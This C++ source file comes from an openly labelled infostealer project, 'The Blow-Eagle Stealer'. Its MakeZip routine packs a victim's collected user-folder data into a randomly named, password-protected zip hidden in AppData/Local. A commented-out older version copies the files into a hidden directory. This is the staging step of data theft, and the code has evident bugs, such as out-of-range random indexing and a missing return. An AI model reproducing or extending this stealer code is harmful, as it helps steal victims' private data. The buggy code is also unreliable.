/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../scripts.h"
#include "../../config/config.cpp"
#include "../../helper/helper.h"

#include <zip.h>


void createPasswordProtectedZip(const std::string& zipFileName, const std::string& folderPath, const std::string& password) {
    // Open the zip archive
    zip_t* zip = zip_open(zipFileName.c_str(), ZIP_CREATE | ZIP_EXCL, nullptr);
    if (zip == nullptr) {
        std::cerr << "Failed to create zip archive." << std::endl;
        return;
    }

    // Add the folder to the archive
    zip_source_t* folderSource = zip_source_zip(zip, folderPath.c_str(), ZIP_FL_ENC_GUESS);
    if (folderSource == nullptr) {
        std::cerr << "Failed to add folder to the zip archive." << std::endl;
        zip_close(zip);
        return;
    }

    // Set password for the zip archive
    if (zip_set_default_password(zip, password.c_str()) < 0) {
        std::cerr << "Failed to set password for the zip archive." << std::endl;
        zip_close(zip);
        return;
    }

    // Add the folder source to the archive
    if (zip_add(zip, folderPath.c_str(), folderSource) < 0) {
        std::cerr << "Failed to add folder source to the zip archive." << std::endl;
        zip_source_free(folderSource);
        zip_close(zip);
        return;
    }

    // Close the zip archive
    if (zip_close(zip) < 0) {
        std::cerr << "Failed to close the zip archive." << std::endl;
        return;
    }

    std::cout << "Zip archive created successfully: " << zipFileName << std::endl;
}


int manager::MakeZip()
{
    std::string user = func::GetUser();

	std::string symbols = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
	std::string name = "";
	std::string pwd = "";
	srand(time(0));
	for (size_t i = 0; i < 30; i++)
	{
		int number = (rand() % (std::size(symbols) - 0 + 1)) + 0;
		name += symbols[number];
	}
    std::string appdata = "C:/Users/" + user + "/AppData/Local";

    name += ".zip";

    name = appdata + "/" + name;

	for (size_t i = 0; i < 60; i++)
	{
		int number = (rand() % (std::size(symbols) - 0 + 1)) + 0;
		pwd += symbols[number];
	}

	std::cout << "zipName: " << name << "\nzipPWD: " << pwd << "\n";

    const std::string folderPath = "C:/Users/" + user + config::path;

    createPasswordProtectedZip(name, folderPath, pwd);
}





/*


#include "../scripts.h"
#include "../../config/config.cpp"
#include "../../helper/helper.h"

#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <windows.h>
//#include <tchar.h>

void createArchiveWithPassword(const std::wstring& archiveFile, const std::wstring& folderPath, const std::string& password);

void compressFile(const std::wstring& sourceFile, const std::wstring& destinationFile);

std::vector<unsigned char> encryptPassword(const std::string& password);

std::vector<unsigned char> encryptPassword(const std::string& password);

std::wstring convertToWstring(const std::string& str);

void manager::MakeZip()
{
    std::string user = func::GetUser();

    std::string symbols = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
    std::string name = "";
    std::string pwd = "";
    srand(time(0));
    for (size_t i = 0; i < 30; i++)
    {
        int number = (rand() % (std::size(symbols) - 0 + 1)) + 0;
        name += symbols[number];
    }
    std::string appdata = "C:/Users/" + user + "/AppData/Local";

    name += ".zip";

    name = appdata + "/" + name;

    for (size_t i = 0; i < 60; i++)
    {
        int number = (rand() % (std::size(symbols) - 0 + 1)) + 0;
        pwd += symbols[number];
    }

    std::cout << "zipName: " << name << "\nzipPWD: " << pwd << "\n";

    const std::string folderPath = "C:/Users/" + user + config::path;

    createArchiveWithPassword(convertToWstring(name), convertToWstring(folderPath), pwd);
}


// Password encryption function
std::vector<unsigned char> encryptPassword(const std::string& password)
{
    std::vector<unsigned char> encrypted;

    // Your custom encryption logic here

    return encrypted;
}

// Compress a file using Windows API
void compressFile(const std::wstring& sourceFile, const std::wstring& destinationFile)
{
    ::SetFileAttributesW(destinationFile.c_str(), FILE_ATTRIBUTE_NORMAL);

    ::CreateDirectoryW(destinationFile.c_str(), nullptr);
    ::SetFileAttributesW(destinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_DIRECTORY);

    ::SHFILEOPSTRUCTW fileOp;
    std::memset(&fileOp, 0, sizeof(SHFILEOPSTRUCTW));
    fileOp.wFunc = FO_COPY;
    fileOp.fFlags = FOF_NO_UI;
    fileOp.pFrom = sourceFile.c_str();
    fileOp.pTo = destinationFile.c_str();
    ::SHFileOperationW(&fileOp);
}

// Create an archive with a password and add a folder to it
void createArchiveWithPassword(const std::wstring& archiveFile, const std::wstring& folderPath, const std::string& password)
{
    std::vector<unsigned char> encryptedPassword = encryptPassword(password);

    std::ofstream archive(archiveFile, std::ios::binary | std::ios::app);
    archive.write((const char*)encryptedPassword.data(), encryptedPassword.size());

    for (const auto& entry : std::filesystem::recursive_directory_iterator(folderPath)) {
        if (entry.is_regular_file()) {
            const std::wstring& filePath = entry.path().wstring();
            const std::wstring& relativePath = entry.path().lexically_relative(folderPath).wstring();

            compressFile(filePath, archiveFile + L"/" + relativePath);
        }
    }

    archive.close();
}

std::wstring convertToWstring(const std::string& str)
{
    std::wstring wStr(str.begin(), str.end());

    return wStr;
}


*/